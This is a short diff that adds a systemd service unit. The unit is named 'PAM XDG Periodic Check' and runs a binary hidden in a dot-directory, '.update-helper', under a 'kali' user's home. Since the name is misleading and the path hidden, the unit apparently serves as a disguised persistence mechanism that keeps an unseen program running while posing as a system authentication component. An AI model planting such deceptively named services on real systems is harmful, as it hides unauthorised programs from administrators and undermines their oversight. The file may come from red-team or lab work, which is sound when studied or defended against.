@@ -1,0 +1,6 @@
+[Unit]
+Description=PAM XDG Periodic Check
+
+[Service]
+Type=simple
+ExecStart=/home/kali/.local/share/.update-helper/.update-helper
